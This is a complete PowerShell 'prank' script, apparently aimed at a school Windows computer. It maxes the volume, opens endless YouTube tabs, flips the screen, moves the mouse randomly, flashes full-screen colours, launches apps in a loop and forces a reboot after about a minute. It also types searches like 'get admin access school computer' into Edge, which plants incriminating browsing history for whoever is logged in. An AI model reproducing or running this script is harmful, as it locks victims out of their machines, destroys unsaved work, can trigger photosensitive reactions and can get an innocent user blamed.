# ------------------ PHASE 1: APPETIZER ------------------

# Max Volume
$wshell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)
    Start-Sleep -Milliseconds 10
}

# Infinite YouTube Tab Spammer (Edge)
Start-Job {
    while ($true) {
        Start-Process "msedge.exe" "https://www.youtube.com/watch?v=fsHXmys3W5w"
        Start-Sleep -Milliseconds 500
    }
}

# Wait 20s before chaos
Start-Sleep -Seconds 20

# ------------------ PHASE 2: CHAOS ------------------

# 1. Screen Orientation Flip
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    $keys = @("^{%}{LEFT}", "^{%}{RIGHT}", "^{%}{UP}", "^{%}{DOWN}")
    while ($true) {
        [System.Windows.Forms.SendKeys]::SendWait($keys | Get-Random)
        Start-Sleep -Seconds 2
    }
}

# 2. Random Mouse Movement
Start-Job {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class MouseMove {
        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);
    }
"@
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    while ($true) {
        $x = Get-Random -Minimum 0 -Maximum $screen.Width
        $y = Get-Random -Minimum 0 -Maximum $screen.Height
        [MouseMove]::SetCursorPos($x, $y)
        Start-Sleep -Milliseconds 200
    }
}

# 3. Flashing Screen Colors
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $form = New-Object Windows.Forms.Form
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.WindowState = 'Maximized'
        $form.BackColor = [Drawing.Color]::FromArgb((Get-Random -Minimum 0 -Maximum 256),
                                                    (Get-Random -Minimum 0 -Maximum 256),
                                                    (Get-Random -Minimum 0 -Maximum 256))
        $form.Opacity = 0.4
        $form.Show()
        Start-Sleep -Milliseconds 300
        $form.Close()
    }
}

# 4. Typed Edge Search Spam
Start-Job {
    Add-Type -AssemblyName System.Windows.Forms
    $queries = @(
        "how to bypass school filter",
        "crash chromebook with command",
        "get admin access school computer",
        "install steam games on school pc",
        "how to cheat with phone"
    )
    while ($true) {
        $q = $queries | Get-Random
        Start-Process "msedge.exe"
        Start-Sleep -Seconds 2
        foreach ($char in $q.ToCharArray()) {
            [System.Windows.Forms.SendKeys]::SendWait($char)
            Start-Sleep -Milliseconds 25
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        Start-Sleep -Seconds 3
    }
}

# 5. Random Application Spam
Start-Job {
    $apps = @("notepad", "calc", "mspaint", "write", "powershell")
    while ($true) {
        Start-Process ($apps | Get-Random)
        Start-Sleep -Milliseconds 800
    }
}

# 6. System Reboot After 60 Seconds Total
Start-Sleep -Seconds 40
Restart-Computer -Force
